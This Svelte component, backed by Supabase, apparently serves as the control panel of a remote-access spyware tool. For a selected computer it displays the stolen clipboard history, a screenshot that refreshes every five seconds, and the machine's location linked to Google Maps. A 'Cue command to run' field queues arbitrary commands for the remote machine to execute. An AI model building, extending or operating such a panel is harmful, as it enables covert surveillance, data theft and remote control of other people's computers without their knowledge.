<script>
    import { debug } from "svelte/internal";
import { supabase } from "../../supabaseClient";
    import {id} from "../../viewStore"
  import Table from "../Dashboard/Table.svelte";
    let val,dataval,data2val,data3val,dataurl
    id.subscribe(value => {
        val = value
    })

    async function fun(){
        const { data, error, status } = await supabase.from('computerinfo').select().eq('id',val);
        let { data: clipboard } = await supabase
  .from('clipboard')
  .select('*')
  .eq('uuid',data[0].uuid)
    .order('created_at', { ascending: false })

    
        dataval = data
        data2val = clipboard

        return data
    }
//     supabase
// .channel('public:countries')
// .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'images' }, payload => {
//   console.log('Change received!', payload)
// })

// .subscribe()

async function fun2(){
    const { data, error, status } = await supabase.from('computerinfo').select().eq('id',val);
        let { data: clipboard } = await supabase
  .from('clipboard')
  .select('*')
  .eq('uuid',data[0].uuid).order('created_at', { ascending: true })  


    let { data: image } = await supabase
  .from('image')
  .select('*')
  .eq('uuid',data[0].uuid)  
  dataurl = "data:image/png;base64,"+image[0].data
    console.log(dataurl)
    data3val = image
    return dataurl
}
let flipflop;
setInterval(() => {
    flipflop = false
    fun2().then((data) => {
        console.log(data);      
        data3val = data
        flipflop = true
        setTimeout(() => {
            flipflop = false
    
        }, 5000);
        })
}, 5000);
    fun().then((data) => {
        console.log(data);      
        dataval = data
    })
let cmd="";
async function sendcmd(e){
    if(cmd=="") return;
    setTimeout(async() => {
    
    const { data, error, status } = await supabase.from('commands').insert([{uuid:dataval[0].uuid,"command":cmd}]);
    }, 100);

}
</script>

<h1>View</h1>
{#await fun() }
<p >loading</p>
{:then dataval} 
     {#each Object.values(dataval) as data}
  <div class="center">
    <img src="{dataurl}" alt="">
  </div>
  <div class="center">
        <Table on:selectedtable bind:selectedData={data2val} mode="view"/>
        </div>
        <div class="infowrap">
            <h4>Info for {Object.values(data)[6]}</h4>
              {#each Object.values(data) as value,index}
              {#if Object.keys(data)[index]==='location'}
              <a href="{'https://www.google.com/maps/?q='+value}" class="info">{Object.keys(data)[index]+": "}{value}</a>
              {/if}
        <p class="info">{Object.keys(data)[index]+": "}{value}</p>
        {/each}
        </div>
          
     {/each} 
{/await}
<div class="center">
    <input type="text" name="command" bind:value={cmd} id="command" placeholder="Cue command to run">
<button on:click|preventDefault={sendcmd}>send cmd</button>
</div>

<div style="margin-bottom:10em"></div>
<style>
    h4{
        color: white;
        text-align: center;
    }
.info{
    color: white;
   
}   
.infowrap{
    margin: 3em;
    background-color: black;
    padding: 2em;
}
h1{
    text-align: center;
    font-size: 5em;
    color: white;
}
p{
    color: white;
}
.center{
    display: flex;
    justify-content: center;
    align-items: center;
}
.center img{
    width: 50%;
    height: 50%;
}
input{
    margin: 1em 0.1em;
    padding: 1em;
    border-radius: 1em;
    border: none;
    background-color: black;
    color: white;
}
button{
    margin: 1em;
    padding: 1em;
    border-radius: 1em;
    border: none;
    background-color: black;
    color: white;
}
button:active{
   transform: scale(1.1);
}
</style>